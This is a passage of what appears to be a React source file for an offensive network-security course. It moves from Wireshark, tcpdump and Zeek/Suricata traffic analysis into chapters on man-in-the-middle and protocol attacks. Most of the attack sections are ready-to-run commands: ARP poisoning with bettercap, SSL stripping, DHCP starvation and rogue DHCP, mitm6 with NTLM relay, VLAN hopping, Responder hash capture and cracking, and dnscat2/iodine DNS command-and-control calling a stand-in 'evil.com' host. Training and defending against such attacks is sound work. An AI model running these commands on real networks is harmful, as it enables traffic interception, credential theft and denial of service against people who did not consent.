ftp             tcp.port == 21
ssh             tcp.port == 22
smb             tcp.port == 445
arp
icmp

# IP address filters:
ip.addr == 192.168.1.100        # src or dst
ip.src == 192.168.1.100         # source only
ip.dst == 192.168.1.100         # dest only
ip.addr == 192.168.1.0/24       # subnet
!(ip.addr == 192.168.1.1)       # exclude IP

# Port filters:
tcp.port == 8080
tcp.dstport == 443
tcp.srcport == 1234
udp.port == 53

# TCP flag filters:
tcp.flags.syn == 1 && tcp.flags.ack == 0    # SYN only (scan detection)
tcp.flags.reset == 1                         # RST packets
tcp.flags.fin == 1                           # FIN packets
tcp.analysis.retransmission                  # retransmissions

# HTTP specific:
http.request.method == "POST"               # POST requests (creds)
http.request.method == "GET"
http.response.code == 200
http.response.code == 401                   # Auth challenge
http.host == "target.com"
http.request.uri contains "login"
http.cookie                                 # packets with cookies
http.authorization                          # auth headers

# DNS specific:
dns.qry.name == "evil.com"
dns.qry.name contains "."                   # subdomains
dns.flags.response == 0                     # queries only
dns.flags.response == 1                     # responses only
dns.resp.len > 200                          # large responses (amplification)

# SMB specific:
smb2.cmd == 5                               # SMB2 Create (file open)
smb.command == 0x72                         # SMB negotiate

# TLS specific:
tls.handshake.type == 1                     # Client Hello
tls.handshake.type == 2                     # Server Hello
tls.alert_message                           # TLS alerts
ssl.alert_message.desc == 42               # bad_certificate

# ARP:
arp.opcode == 1                             # ARP request (who has?)
arp.opcode == 2                             # ARP reply (I have!)
# Detect ARP poisoning: multiple IPs claiming same MAC
# or same IP with changing MACs

# Frame level:
frame.number == 42                          # specific frame
frame.len > 1400                            # large frames
frame.time_delta > 1                        # gaps in traffic`}</Pre>

        <H>Following Streams</H>
        <Pre label="// REASSEMBLE CONVERSATIONS FROM PACKETS">{`# In Wireshark GUI:
# Right-click any packet -> Follow -> TCP Stream
# Right-click any packet -> Follow -> UDP Stream
# Right-click any HTTP packet -> Follow -> HTTP Stream
# Right-click any TLS packet -> Follow -> TLS Stream (needs key)

# What you see in stream view:
# RED text = client to server
# BLUE text = server to client

# In TShark:
tshark -r capture.pcap -q -z follow,tcp,ascii,0
# 0 = first TCP stream, 1 = second, etc.

tshark -r capture.pcap -q -z follow,tcp,ascii,5   # stream 5`}</Pre>

        <H>Statistics and Analysis Features</H>
        <Pre label="// WIRESHARK STATISTICS MENU">{`Protocol Hierarchy:
  Statistics -> Protocol Hierarchy
  Shows breakdown of all protocols by % of traffic
  Immediately reveals unusual protocols (DNS 40% = tunneling?)

Conversations:
  Statistics -> Conversations
  Top talkers by bytes, packets, duration
  Find who is talking to whom most

Endpoints:
  Statistics -> Endpoints
  All unique IPs/MACs and their traffic volumes

IO Graphs:
  Statistics -> IO Graph
  Plot traffic rate over time
  Spike = burst / attack, flat = steady exfil

Flow Graph:
  Statistics -> Flow Graph
  Sequence diagram of TCP/UDP flows
  See handshakes, data flow, teardowns visually

Export Objects:
  File -> Export Objects -> HTTP
  Extracts files transferred over HTTP (images, archives, scripts)
  Also: FTP-DATA, DICOM, SMB, TFTP

Expert Information:
  Analyze -> Expert Information
  Wireshark flags: retransmissions, resets, bad checksums
  Good starting point for anomaly investigation`}</Pre>

        <H>tcpdump - Command Line Packet Capture</H>
        <Pre label="// TCPDUMP ESSENTIAL SYNTAX">{`# Basic capture on interface:
sudo tcpdump -i eth0

# Write to file (for analysis in Wireshark):
sudo tcpdump -i eth0 -w capture.pcap

# Read from file:
tcpdump -r capture.pcap

# With timestamps and verbose:
sudo tcpdump -i eth0 -tttt -vv

# Capture specific host:
sudo tcpdump -i eth0 host 192.168.1.100

# Capture specific port:
sudo tcpdump -i eth0 port 80

# Capture HTTP POST requests:
sudo tcpdump -i eth0 -A port 80 | grep -i "POST\|username\|password\|login"

# Capture DNS queries:
sudo tcpdump -i eth0 port 53 -n

# Limit packet count:
sudo tcpdump -i eth0 -c 1000 -w capture.pcap

# Ring buffer (rotate files, prevent disk fill):
sudo tcpdump -i eth0 -w capture_%Y%m%d_%H%M%S.pcap -G 3600 -C 100

# Show ethernet headers:
sudo tcpdump -e -i eth0

# Don't resolve names (faster, less DNS noise):
sudo tcpdump -n -i eth0

# Verbose packet decode:
sudo tcpdump -i eth0 -vv -X port 80`}</Pre>
        <Pre label="// REMOTE CAPTURE - SSH PIPE TO LOCAL WIRESHARK">{`# Capture on remote host, display locally in Wireshark:
ssh user@REMOTE_HOST "sudo tcpdump -i eth0 -w - not port 22" | wireshark -k -i -

# With filter:
ssh user@REMOTE_HOST "sudo tcpdump -i eth0 -w - port 80" | wireshark -k -i -

# Save to file instead:
ssh user@REMOTE_HOST "sudo tcpdump -i eth0 -w -" > remote_capture.pcap`}</Pre>

        <H>TShark - Command-Line Wireshark</H>
        <Pre label="// TSHARK FIELD EXTRACTION AND STATISTICS">{`# Capture live:
tshark -i eth0

# Read pcap:
tshark -r capture.pcap

# Apply display filter:
tshark -r capture.pcap -Y "http.request.method == POST"

# Extract specific fields (-T fields -e field):
tshark -r capture.pcap -Y http.request -T fields \
  -e http.host -e http.request.uri -e http.request.method

# Extract credentials from HTTP POST:
tshark -r capture.pcap -Y "http.request.method == POST" \
  -T fields -e ip.src -e http.host -e urlencoded-form.key -e urlencoded-form.value

# Extract all DNS queries:
tshark -r capture.pcap -Y dns -T fields \
  -e frame.time -e ip.src -e dns.qry.name -e dns.resp.addr

# Extract FTP credentials:
tshark -r capture.pcap -Y "ftp.request.command == USER or ftp.request.command == PASS" \
  -T fields -e ip.src -e ftp.request.arg

# Top talkers:
tshark -r capture.pcap -q -z conv,tcp | head -20

# Protocol stats:
tshark -r capture.pcap -q -z io,phs

# Detect ARP spoofing (duplicate IPs):
tshark -r capture.pcap -Y arp -T fields \
  -e arp.src.proto_ipv4 -e arp.src.hw_mac | sort | uniq -d`}</Pre>

        <H>Encrypted Traffic Analysis - JA3 Fingerprinting</H>
        <Pre label="// IDENTIFYING C2 IN TLS TRAFFIC">{`JA3 FINGERPRINTING:
  TLS Client Hello contains: version, cipher suites, extensions,
  elliptic curves, elliptic curve point formats
  JA3 = MD5 hash of these fields in specific order
  Same client app + version = same JA3 hash
  Known C2 frameworks have known JA3 hashes

JA3S = Server Hello fingerprint
  JA3 + JA3S combination identifies specific client-server pair

TOOLS:
  # Zeek generates JA3 logs automatically (ssl.log)
  # ja3 tool for pcap:
  python3 ja3.py capture.pcap

  # Find Cobalt Strike beacon (known JA3):
  tshark -r capture.pcap -Y tls.handshake.type==1 \
    -T fields -e ip.src -e tls.handshake.ja3

CERTIFICATE ANALYSIS:
  # Extract certificates from pcap:
  tshark -r capture.pcap -Y "tls.handshake.certificate" \
    -T fields -e tls.handshake.certificate | xxd -r -p | openssl x509 -inform DER -text

  # Suspicious cert indicators:
  - Self-signed certificate
  - Subject/Issuer mismatch
  - Very short validity period
  - Generic CN (localhost, example.com)
  - Cert issued to known C2 infrastructure`}</Pre>

        <H>Network Forensics - Reconstructing Files from pcap</H>
        <Pre label="// EXTRACT FILES AND CREDENTIALS FROM CAPTURES">{`WIRESHARK EXPORT OBJECTS:
  File -> Export Objects -> HTTP
    Exports: HTML, images, JS, downloads, ZIP files
  File -> Export Objects -> FTP-DATA
    Exports all files transferred over FTP
  File -> Export Objects -> SMB/SMB2
    Exports files accessed over SMB shares

NETWORK MINER (passive forensics tool):
  Free tool, Windows/Linux
  Auto-extracts: files, images, emails, credentials
  Opens pcap and organizes everything visually

FOREMOST / SCALPEL (file carving from raw bytes):
  foremost -i capture.pcap -o output_dir/
  Finds embedded files by magic bytes (headers/footers)

TSHARK CREDENTIAL EXTRACTION:
  # HTTP Basic auth:
  tshark -r capture.pcap -Y http.authorization \
    -T fields -e ip.src -e http.authorization

  # Telnet sessions:
  tshark -r capture.pcap -Y telnet -T fields -e telnet.data | tr -d '\n'

  # FTP creds:
  tshark -r capture.pcap -Y "ftp.request" \
    -T fields -e ip.src -e ftp.request.command -e ftp.request.arg

PCAP ANALYSIS FOR ATTACK PATTERNS:
  # Large number of SYN with no SYN-ACK = port scan
  tshark -r capture.pcap -Y "tcp.flags.syn==1 && tcp.flags.ack==0" \
    -T fields -e ip.src -e tcp.dstport | sort | uniq -c | sort -rn

  # ARP poisoning: same IP, multiple MACs
  tshark -r capture.pcap -Y arp.opcode==2 -T fields \
    -e arp.src.proto_ipv4 -e arp.src.hw_mac | sort | uniq | \
    awk -F'\t' '{print $1}' | sort | uniq -d`}</Pre>

        <H>Zeek and Suricata Overview</H>
        <Pre label="// NETWORK ANALYSIS FRAMEWORKS">{`ZEEK (formerly Bro) - Network Analysis Framework:
  Not IDS/IPS - generates structured logs for analysis
  Logs generated: conn.log, dns.log, http.log, ssl.log,
                  files.log, weird.log, notice.log

  # Install and run:
  zeek -i eth0                    # live interface
  zeek -r capture.pcap            # analyze pcap

  # Key log files:
  conn.log    - all connections (src, dst, proto, duration, bytes)
  dns.log     - all DNS queries and responses
  http.log    - HTTP requests (method, host, uri, status, mime)
  ssl.log     - TLS metadata (JA3, cipher, server cert CN)
  files.log   - all files transferred (hash, mime type, size)
  weird.log   - protocol anomalies

  # Zeek scripting for detection:
  # Example: detect DNS queries to unusual TLDs
  event dns_request(c: connection, msg: dns_msg, query: string, ...) {
    if ( /.+\.(xyz|tk|pw|cc)$/ in query )
      NOTICE([$note=DNS_Suspicious, $msg=query]);
  }

SURICATA - NIDS/NIPS:
  Drop-in replacement for Snort, multi-threaded
  EVE JSON output for SIEM ingestion
  Rule format compatible with Snort rules

  # Run on interface:
  suricata -c /etc/suricata/suricata.yaml -i eth0

  # Run on pcap:
  suricata -r capture.pcap -c /etc/suricata/suricata.yaml

  # Sample rule for C2 beacon detection:
  alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"Potential Cobalt Strike Beacon";
    content:"Content-Type|3a 20|application/octet-stream";
    http_header; threshold:type both, track by_src, count 10, seconds 60;
    sid:9000001; rev:1;
  )`}</Pre>
      </div>
    ),
    takeaways: [
      'Capture filters (BPF) discard packets at capture time - display filters only hide them. Use capture filters to save disk space on long captures',
      'Follow TCP Stream in Wireshark reassembles the complete conversation - essential for reading cleartext credentials in protocols like FTP, HTTP, Telnet',
      'JA3/JA3S fingerprinting identifies C2 frameworks by their TLS Client Hello fingerprint even when traffic is fully encrypted',
      'Export Objects (File menu) extracts every file transferred over HTTP, FTP, or SMB from a pcap - critical for forensic investigations',
      'Zeek generates structured logs (conn.log, dns.log, ssl.log) that are far more useful for analysis than raw pcap - combine with grep/awk for threat hunting'
    ]
  },

  {
    id: 'ch4-mitm-l2',
    title: 'MITM and Layer 2 Attacks',
    difficulty: 'INTERMEDIATE',
    readTime: '18 min',
    content: (
      <div>
        <P>Layer 2 attacks exploit the trust assumptions built into Ethernet and WiFi protocols. ARP has no authentication. DHCP has no authentication. STP elects root bridges without authentication. VLANs can be hopped. This chapter covers the tools and techniques to exploit these weaknesses.</P>

        <H>ARP Poisoning Theory and Tools</H>
        <Note label="HOW ARP WORKS">ARP maps IP addresses to MAC addresses on your local network. When your computer wants to talk to 192.168.1.1, it broadcasts "Who has 192.168.1.1?" and the gateway replies "I do, my MAC is AA:BB:CC:DD:EE:FF." The problem: any device can reply to any ARP request with any MAC address. There is no verification.</Note>
        <Pre label="// ARP POISONING - INTERCEPT LAN TRAFFIC">{`# How the attack works:
# 1. Tell victim: "The gateway (192.168.1.1) is at MY MAC"
# 2. Tell gateway: "The victim (192.168.1.50) is at MY MAC"
# 3. Enable IP forwarding so traffic still reaches destination
# 4. All victim-gateway traffic now passes through your machine

# Step 1: Enable IP forwarding (CRITICAL - without this, traffic drops):
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
# Permanent:
echo "net.ipv4.ip_forward = 1" | sudo tee -a /etc/sysctl.conf

# Step 2a: arpspoof (classic, from dsniff):
sudo apt install dsniff
sudo arpspoof -i INTERFACE_HERE -t VICTIM_IP GATEWAY_IP &   # poison victim
sudo arpspoof -i INTERFACE_HERE -t GATEWAY_IP VICTIM_IP &   # poison gateway

# Step 2b: bettercap (modern, recommended):
sudo bettercap -iface INTERFACE_HERE

# In bettercap interactive console:
net.probe on                              # discover all hosts
net.show                                  # list discovered hosts
set arp.spoof.targets VICTIM_IP           # target specific host
set arp.spoof.fullduplex true             # poison both directions
arp.spoof on
net.sniff on                              # capture traffic

# Step 3: Capture with tcpdump while poisoning:
sudo tcpdump -i INTERFACE_HERE -w mitm_capture.pcap host VICTIM_IP`}</Pre>

        <H>Bettercap Complete Reference</H>
        <Pre label="// BETTERCAP MODULES AND COMMANDS">{`# Start bettercap on interface:
sudo bettercap -iface eth0
sudo bettercap -iface eth0 -caplet caplets/http-req-dump.cap

NETWORK MODULES:
  net.probe on/off         # Probe network for hosts (ARP + mDNS)
  net.show                 # Show all discovered hosts
  net.recon on/off         # Passive host discovery

ARP MODULE:
  arp.spoof on/off
  set arp.spoof.targets IP1,IP2   # Specific targets (empty = all)
  set arp.spoof.fullduplex true   # Poison both victim and gateway
  set arp.spoof.whitelist IP      # Never poison these IPs
  arp.ban on/off                  # Drop (not forward) victim traffic = DoS

DNS MODULE:
  set dns.spoof.domains evil.com,bank.com
  set dns.spoof.address YOUR_IP
  set dns.spoof.all true           # Spoof ALL domains
  dns.spoof on/off

HTTPS/HTTP PROXY MODULE:
  set https.proxy.sslstrip true    # Enable SSL stripping
  https.proxy on/off
  http.proxy on/off
  set http.proxy.script inject.js  # Inject JavaScript

PACKET SNIFFER:
  net.sniff on/off
  set net.sniff.verbose true
  set net.sniff.filter "port 80 or port 21"  # BPF filter
  set net.sniff.output capture.pcap

WIFI (wireless adapter required):
  wifi.recon on/off        # Discover WiFi networks
  wifi.show                # List APs and clients
  wifi.deauth MAC_ADDR     # Deauth specific client
  wifi.assoc BSSID         # Associate with AP

CAPLETS (automated scripts):
  sudo bettercap -caplet caplets/pwnagotchi-auto.cap
  # Built-in caplets in /usr/share/bettercap/caplets/`}</Pre>

        <H>SSL Stripping and HSTS Bypass</H>
        <Pre label="// DOWNGRADE HTTPS TO HTTP">{`SSL STRIPPING ATTACK CHAIN:
  1. ARP poison victim (you = MITM position)
  2. Victim types: http://bank.com (no HTTPS yet)
  3. Your machine receives the HTTP request
  4. You connect to bank.com via HTTPS
  5. You serve victim an HTTP version
  6. Victim sees HTTP, you read all traffic

HSTS (HTTP Strict Transport Security) LIMITATION:
  If bank.com has HSTS, victim browser REFUSES to connect via HTTP
  HSTS Preload: built into browser, even first visit uses HTTPS
  Check preload list: https://hstspreload.org
  SSL strip fails on HSTS-preloaded sites

BETTERCAP SSL STRIP:
  set https.proxy.sslstrip true
  https.proxy on
  arp.spoof on

LEGACY SSLSTRIP:
  # 1. IP forwarding:
  echo 1 > /proc/sys/net/ipv4/ip_forward
  # 2. Redirect port 80 to sslstrip:
  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
  # 3. Run sslstrip:
  sslstrip -l 10000 -w sslstrip.log
  # 4. ARP poison:
  arpspoof -i INTERFACE_HERE -t VICTIM_IP GATEWAY_IP

MITMPROXY - INTERACTIVE MITM PROXY:
  # Install:
  pip install mitmproxy

  # Transparent proxy mode (requires iptables redirect):
  mitmproxy --mode transparent --listen-port 8080

  # Regular proxy mode:
  mitmproxy -p 8080

  # Scripted interception (Python):
  # Create script.py:
  # def request(flow):
  #     if "password" in flow.request.pretty_url:
  #         print(flow.request.pretty_url)
  mitmproxy -p 8080 -s script.py

  # mitmweb (browser UI):
  mitmweb -p 8080`}</Pre>

        <H>DHCP Attacks</H>
        <Pre label="// DHCP STARVATION AND ROGUE DHCP SERVER">{`DHCP STARVATION (exhaust IP pool):
  1. Send thousands of DHCP DISCOVER packets with spoofed MACs
  2. DHCP server assigns all available IPs to fake MACs
  3. Legitimate hosts cannot get IP addresses
  4. Network effectively DoS'd

  # Gobbler:
  sudo gobbler -i INTERFACE_HERE

  # Yersinia:
  sudo yersinia dhcp -attack 1 -interface INTERFACE_HERE
  # Attack 1 = send DISCOVER packets

ROGUE DHCP SERVER (after starvation or race):
  After starving legitimate server, deploy your own
  Assign yourself as default gateway -> MITM all traffic
  Assign yourself as DNS server -> control all DNS resolution

  # Metasploit rogue DHCP:
  use auxiliary/server/dhcp
  set SRVHOST YOUR_IP
  set ROUTER YOUR_IP        # send traffic to you
  set DNSSERVER YOUR_IP     # control DNS
  set NETMASK 255.255.255.0
  set START 192.168.1.100
  set STOP 192.168.1.200
  run

  # dnsmasq as rogue DHCP:
  # /etc/dnsmasq.conf:
  # interface=INTERFACE_HERE
  # dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h
  # dhcp-option=3,YOUR_IP    (default gateway)
  # dhcp-option=6,YOUR_IP    (DNS server)
  sudo dnsmasq -d`}</Pre>

        <H>IPv6 Attacks and mitm6</H>
        <Pre label="// IPv6 MITM AND NTLM RELAY CHAIN">{`mitm6 ATTACK CHAIN:
  Most Windows networks: IPv6 enabled but not configured
  Windows prefers IPv6 over IPv4 if router advertises it
  mitm6 sends DHCPv6 responses claiming to be IPv6 router
  Windows systems accept DHCPv6 and use mitm6 as DNS server
  mitm6 returns its IP for ALL DNS queries
  Combined with ntlmrelayx = NTLMv2 hash capture / relay

  # Install:
  pip install mitm6

  # Run mitm6 (target domain):
  sudo mitm6 -d CORP.LOCAL

  # Simultaneously run ntlmrelayx:
  sudo impacket-ntlmrelayx -6 -t ldaps://DC_IP -wh WPAD.CORP.LOCAL -l loot

  # What happens:
  1. mitm6 sends Router Advertisements / DHCPv6 to Windows clients
  2. Windows clients use mitm6 IP as IPv6 DNS
  3. Windows tries WPAD proxy discovery -> goes to mitm6
  4. mitm6 responds: connect to ntlmrelayx for WPAD
  5. Windows authenticates to ntlmrelayx with NTLMv2
  6. ntlmrelayx relays to LDAP/LDAPS on domain controller
  7. Creates new domain user or dumps LDAP data

OTHER IPv6 ATTACKS:
  flood6   - Router Advertisement flood
  fake_router6 - Rogue IPv6 router (thc-ipv6 toolkit)
  parasite6  - NDP poisoning (IPv6 ARP spoofing)
  redir6     - ICMPv6 redirect`}</Pre>

        <H>VLAN Hopping</H>
        <Pre label="// BREAK VLAN SEGMENTATION">{`VLAN HOPPING METHOD 1 - Switch Spoofing:
  802.1Q trunk ports carry traffic for ALL VLANs
  DTP (Dynamic Trunking Protocol) negotiates trunk automatically
  Attack: send DTP frames to negotiate trunk mode
  Result: switch treats your port as trunk = you see all VLANs

  # Yersinia DTP attack:
  sudo yersinia dtp -attack 1 -interface INTERFACE_HERE
  # Attack 1 = enable trunking

  # scapy DTP frame:
  from scapy.all import *
  from scapy.contrib.dtp import *
  sendp(Dot3()/LLC()/SNAP()/DTP(tlvlist=[DTPDomain(),DTPStatus(),DTPType(),DTPNeighbor()]))

VLAN HOPPING METHOD 2 - Double Tagging:
  You are in VLAN 1 (native VLAN on trunk)
  Craft frame with TWO 802.1Q tags: outer=VLAN1, inner=VLAN10
  First switch strips outer tag (VLAN1 = native, no tag needed)
  Second switch sees inner tag -> delivers to VLAN10
  LIMITATION: one-way only (responses cannot reach you)

  # Scapy double tag:
  from scapy.all import *
  pkt = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=10)/IP(dst="10.10.0.1")/ICMP()
  sendp(pkt, iface="INTERFACE_HERE")

DEFENSE:
  switchport mode access          # Never negotiate trunk
  switchport nonegotiate          # Disable DTP
  switchport access vlan X        # Explicit VLAN
  no native VLAN on trunks (use VLAN 999)
  Enable BPDU guard on access ports`}</Pre>

        <H>Yersinia - Layer 2 Protocol Attacks</H>
        <Pre label="// YERSINIA ATTACK FRAMEWORK">{`# Install:
sudo apt install yersinia

# GUI mode:
sudo yersinia -G

# Interactive terminal mode:
sudo yersinia -I

# Command line attacks:
sudo yersinia PROTOCOL -attack NUM -interface INTERFACE_HERE

PROTOCOLS AND KEY ATTACKS:
  STP (Spanning Tree Protocol):
    sudo yersinia stp -attack 2 -interface INTERFACE_HERE
    Attack 2 = claiming root bridge role
    Result: all traffic flows through your machine -> MITM entire network
    sudo yersinia stp -attack 4    # BPDU flood

  DHCP:
    sudo yersinia dhcp -attack 1   # DISCOVER flood (starvation)
    sudo yersinia dhcp -attack 2   # RELEASE flood

  802.1Q (VLAN):
    sudo yersinia dot1q -attack 1  # Double encapsulation

  DTP:
    sudo yersinia dtp -attack 1    # Enable trunking

  CDP (Cisco Discovery Protocol):
    sudo yersinia cdp -attack 1    # Flood CDP table
    sudo yersinia cdp -attack 2    # Fake CDP neighbor (info injection)

  HSRP (Hot Standby Router Protocol):
    sudo yersinia hsrp -attack 2   # Become active router
    Result: MITM all routed traffic

  VTP (VLAN Trunking Protocol):
    sudo yersinia vtp -attack 1    # Delete all VLANs (nuclear option)`}</Pre>

        <H>MAC Flooding and CAM Table Overflow</H>
        <Pre label="// FILL THE SWITCH CAM TABLE - FORCE HUB MODE">{`HOW IT WORKS:
  Switches maintain CAM table: MAC -> port mappings
  CAM table has finite size (typically 8000-64000 entries)
  When full: switch cannot learn new MACs
  Unknown destination MAC = flood to all ports (hub behavior)
  Result: you receive ALL traffic, not just your own

# macof (from dsniff):
sudo apt install dsniff
sudo macof -i INTERFACE_HERE              # flood with random MACs
sudo macof -i INTERFACE_HERE -n 10000    # send 10000 frames

# What macof does:
# Sends frames with random src MACs, rapid fire
# Fills switch CAM table in seconds
# Switch enters fail-open mode (broadcasts everything)
# Your promiscuous mode NIC captures all frames

CAPTURE WHILE FLOODING:
sudo macof -i INTERFACE_HERE &
sudo tcpdump -i INTERFACE_HERE -w cam_flood.pcap

DETECTION:
  Many managed switches detect MAC flooding
  Port security: max MAC count per port, violation = shutdown
  Dynamic ARP inspection also helps

MITIGATION:
  switchport port-security maximum 5
  switchport port-security violation restrict`}</Pre>
      </div>
    ),
    takeaways: [
      'ARP poisoning requires enabling IP forwarding first - without it, intercepted traffic drops and the victim loses connectivity, revealing the attack',
      'mitm6 exploits Windows preference for IPv6 over IPv4 - on dual-stack networks with no legitimate IPv6 infrastructure, mitm6 becomes de facto IPv6 router and DNS server',
      'VLAN double tagging is one-directional only - you can send frames into the target VLAN but cannot receive responses, limiting its use',
      'STP root election attack via Yersinia makes all switch traffic flow through your machine - it is the most impactful L2 attack on a switched network',
      'DHCP starvation followed by rogue DHCP gives you gateway and DNS control over the entire segment - combining both makes every connected host vulnerable'
    ]
  },

  {
    id: 'ch5-protocol-attacks',
    title: 'Protocol-Specific Attacks',
    difficulty: 'ADVANCED',
    readTime: '22 min',
    content: (
      <div>
        <P>Every network protocol has its own attack surface. This chapter covers the specific vulnerabilities, exploitation techniques, and tools for the most commonly attacked protocols in enterprise and internet-facing environments.</P>

        <H>SMB Attacks - Responder and NTLM Relay</H>
        <Pre label="// RESPONDER - POISON LLMNR/NBT-NS/mDNS">{`BACKGROUND:
  LLMNR (Link-Local Multicast Name Resolution) - Windows fallback DNS
  NBT-NS (NetBIOS Name Service) - legacy Windows name resolution
  mDNS (Multicast DNS) - Apple/Linux name resolution
  When DNS fails, Windows broadcasts on local network
  Responder answers all queries claiming to be the target
  Windows authenticates automatically -> NTLMv2 hash captured

# Install:
sudo apt install responder
# or: git clone https://github.com/lgandx/Responder

# Basic run (capture hashes):
sudo responder -I INTERFACE_HERE

# With verbose output:
sudo responder -I INTERFACE_HERE -v

# Analyze mode (passive, no poisoning - for analysis only):
sudo responder -I INTERFACE_HERE -A

# What Responder poisons:
  LLMNR     - UDP multicast 224.0.0.252 port 5355
  NBT-NS    - UDP broadcast port 137
  mDNS      - UDP multicast 224.0.0.251 port 5353
  WPAD      - Web Proxy Auto-Discovery
  BROWSER   - Windows Browser Service

# Captured hashes saved to:
/usr/share/responder/logs/SMBv2-NTLMv2-SSP-IP.txt

# Crack captured NTLMv2 with hashcat:
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt`}</Pre>
        <Pre label="// NTLM RELAY - RELAY CAPTURED HASHES">{`NTLM RELAY CHAIN:
  1. Responder captures NTLMv2 authentication attempt
  2. Instead of cracking, RELAY it to another service
  3. Authenticate AS THE VICTIM to target service
  4. No password cracking needed - pass-the-relay

  # Run ntlmrelayx (impacket):
  sudo impacket-ntlmrelayx -tf targets.txt -smb2support
  # targets.txt = list of IPs to relay to

  # IMPORTANT: disable SMB and HTTP in Responder first:
  # Edit /etc/responder/Responder.conf:
  # SMB = Off
  # HTTP = Off
  # Then run Responder for LLMNR/NBT-NS only
  sudo responder -I INTERFACE_HERE

  # Relay to SMB (dump SAM/NTDS):
  sudo impacket-ntlmrelayx -tf targets.txt -smb2support

  # Relay to LDAP (create domain user):
  sudo impacket-ntlmrelayx -t ldap://DC_IP --delegate-access

  # Relay to MSSQL (xp_cmdshell):
  sudo impacket-ntlmrelayx -t mssql://DB_SERVER --interactive

  # Interactive shell mode:
  sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i
  # Then connect: nc 127.0.0.1 11000 (interactive SMB shell)

REQUIREMENT: SMB signing must be disabled on target
  # Check with nmap:
  nmap --script smb2-security-mode -p 445 192.168.1.0/24
  # or CrackMapExec:
  crackmapexec smb 192.168.1.0/24 --gen-relay-list smb_unsigned.txt`}</Pre>

        <H>DNS Attacks</H>
        <Pre label="// ZONE TRANSFER, AMPLIFICATION, TUNNELING">{`ZONE TRANSFER (AXFR) - dump entire DNS zone:
  # If nameserver allows AXFR from any IP (misconfiguration):
  dig axfr target.com @ns1.target.com
  host -l target.com ns1.target.com
  fierce --domain target.com

DNS AMPLIFICATION (DRDoS - Distributed Reflected DoS):
  Attack: send DNS ANY queries with spoofed source IP (victim's IP)
  DNS server responds to victim with large response (up to 100x amplification)
  3000 queries/sec -> 30 Gbps hitting victim
  Mitigation: BCP38 (ingress filtering), DNS rate limiting, Response Rate Limiting (RRL)

DNS TUNNELING - exfil data over DNS:
  Works because DNS is usually allowed through firewalls
  Encode data as subdomains: base64DATA.tunnel.evil.com
  Server decodes and responds with encoded data in TXT/CNAME records

dnscat2 - DNS C2 channel:
  # Server (on VPS with domain pointing to your NS):
  sudo ruby dnscat2.rb dns.evil.com

  # Client (on target):
  ./dnscat dns.evil.com
  # or PowerShell:
  Start-Dnscat2 -Domain dns.evil.com

  # In dnscat2 server shell:
  sessions         # list active sessions
  session -i 1     # interact with session 1
  shell            # get shell
  exec cmd.exe

iodine - IP over DNS tunneling:
  # Server (needs domain + NS records pointing to your server):
  sudo iodined -f -c -P password 10.0.0.1 tunnel.evil.com

  # Client (on target or restricted network):
  sudo iodine -f -P password tunnel.evil.com
  # Creates tun0 interface with IP 10.0.0.2
  # Route traffic through: route add default gw 10.0.0.1 tun0`}</Pre>

        <H>SSH Tunneling for Pivoting</H>
        <Pre label="// SSH TUNNELS - THREE MODES">{`LOCAL PORT FORWARD (-L):
  Access internal service through SSH jump host
  "Forward my LOCAL_PORT to INTERNAL_HOST:PORT via SSH server"

  ssh -L LOCAL_PORT:INTERNAL_HOST:INTERNAL_PORT user@SSH_HOST

  Example: access internal web server at 10.0.0.5:80
  ssh -L 8080:10.0.0.5:80 user@PIVOT_HOST
  Now browse: http://localhost:8080

REMOTE PORT FORWARD (-R):
  Expose your local service through remote SSH server
  "Forward REMOTE_PORT on SSH server to my localhost:PORT"

  ssh -R REMOTE_PORT:localhost:LOCAL_PORT user@SSH_HOST

  Example: expose local Metasploit handler through target
  ssh -R 4444:localhost:4444 user@PIVOT_HOST
  Now target hosts can reach your handler via SSH host:4444

DYNAMIC SOCKS PROXY (-D):
  Turn SSH into full SOCKS5 proxy for entire subnets
  Route ALL tool traffic through compromised host

  ssh -D 1080 -N -f user@PIVOT_HOST
  # -N = no command execution, -f = background

  # Use with proxychains:
  # Edit /etc/proxychains4.conf:
  # socks5 127.0.0.1 1080
  proxychains nmap -sT -p 22,80,443 INTERNAL_RANGE

SSHUTTLE - VPN OVER SSH:
  Routes entire subnet through SSH without proxychains
  sudo sshuttle -r user@PIVOT_HOST 10.0.0.0/24 -v
  sudo sshuttle -r user@PIVOT_HOST 0/0   # all traffic`}</Pre>

        <H>SNMP Attacks</H>
        <Pre label="// SNMP ENUMERATION AND EXPLOITATION">{`BACKGROUND:
  SNMP (Simple Network Management Protocol) on UDP 161
  v1/v2c: community string = cleartext password
  Default community strings: public (read), private (write)
  v3: adds authentication + encryption (more secure)
  Write access = change device config remotely

# onesixtyone - community string brute force:
sudo apt install onesixtyone
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt TARGET_IP
# community.txt: public, private, manager, cisco, snmp

# snmpwalk - enumerate MIB tree:
snmpwalk -v2c -c public TARGET_IP
snmpwalk -v2c -c public TARGET_IP 1.3.6.1.2.1.1    # system info
snmpwalk -v2c -c public TARGET_IP 1.3.6.1.2.1.25.4  # running processes
snmpwalk -v2c -c public TARGET_IP 1.3.6.1.2.1.4.20  # IP addresses
snmpwalk -v2c -c public TARGET_IP 1.3.6.1.4.1.77.1.2.25  # Windows users

# snmpset - write to MIB (with write community string):
snmpset -v2c -c private TARGET_IP OID_HERE s "new_value"

# nmap SNMP scripts:
nmap -sU -p 161 --script snmp-info TARGET_IP
nmap -sU -p 161 --script snmp-interfaces TARGET_IP
nmap -sU -p 161 --script snmp-processes TARGET_IP
nmap -sU -p 161 --script snmp-brute TARGET_IP

# Metasploit SNMP scanner:
use auxiliary/scanner/snmp/snmp_login
set RHOSTS TARGET_RANGE
run`}</Pre>

        <H>Redis Unauthenticated RCE</H>
        <Pre label="// REDIS - UNAUTHENTICATED ACCESS TO RCE">{`# Check for unauthenticated Redis:
redis-cli -h TARGET_IP ping
# Response "PONG" = no auth required

# Basic enumeration:
redis-cli -h TARGET_IP
  INFO                  # server info, version
  CONFIG GET *          # dump all config
  KEYS *                # list all keys
  GET key_name          # read value

# TECHNIQUE 1: Write SSH authorized_keys:
# (requires Redis running as root or web user with .ssh)
